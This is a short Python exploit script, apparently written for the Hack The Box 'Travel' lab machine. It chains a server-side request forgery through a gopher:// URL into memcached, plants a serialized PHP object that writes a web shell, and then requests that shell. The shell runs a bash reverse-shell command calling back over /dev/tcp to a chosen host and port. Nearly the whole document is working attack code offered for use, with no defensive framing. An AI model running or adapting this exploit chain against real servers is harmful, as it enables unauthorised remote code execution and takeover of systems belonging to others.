#!/usr/bin/python3
import requests
import sys
import hashlib
import urllib.parse
import time

if(len(sys.argv) != 2):
    print("wrong usage, usage is ./exploit.py (IP ADDR)")
    quit()

ip = sys.argv[1]
myurl = "http://"+ip+"/cool.xml"

hash1 = hashlib.md5(myurl.encode()).hexdigest() 
hash1 = hash1+":spc"
hash2 = "xct_"+hashlib.md5((hash1).encode()).hexdigest()

phpserialized = '''O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:71:"<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/'''+ip+'''/1234 0>&1'");";}'''

#this part is taken from gopherus, I didnt write it
payload = "%0d%0aset "+hash2+" 4 0 " + str(len(phpserialized)) + "%0d%0a" +  phpserialized + "%0d%0a"
finalpayload = "gopher://127.0.1:11211/_"+ urllib.parse.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

baseurl = "http://blog.travel.htb/awesome-rss/?q=custom_feed_url&debug=true&west="
payloadurl = "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php"


r = requests.get(baseurl+finalpayload)
time.sleep(0.5)
r = requests.get(baseurl+myurl)
time.sleep(0.5)
r = requests.get(payloadurl)
